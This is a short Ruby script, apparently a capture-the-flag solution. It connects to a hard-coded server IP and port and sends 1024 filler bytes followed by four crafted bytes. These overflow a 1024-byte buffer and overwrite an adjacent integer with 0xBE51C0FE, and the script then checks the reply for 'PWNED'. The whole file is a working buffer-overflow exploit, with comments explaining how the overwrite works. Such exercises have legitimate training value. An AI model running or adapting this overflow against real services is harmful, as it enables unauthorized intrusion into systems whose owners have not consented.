require 'socket'

# Server read 1028byte, but buffer array is 1024byte.
# buffer's upper memory is pownd integer(maybe 32bit) and check server this integer.
# powned need 0xBE51C0FE <- (0xc0fe ^ 0x7eaf) << 16 + (0x1a1a ^ 0xdae4)

server = "52.197.128.90"
port   = 85#80-85 is available

client = TCPSocket.open(server, port)

data   = Array.new(1024, 0x41)
data.concat([0xFE, 0xC0, 0x51, 0xBE])
client.write(data.pack("c*"))

line = client.read(8)
p line
line = client.read(5)
if line == "PWNED"
  p client.read
else
  p line + client.read(2)
end
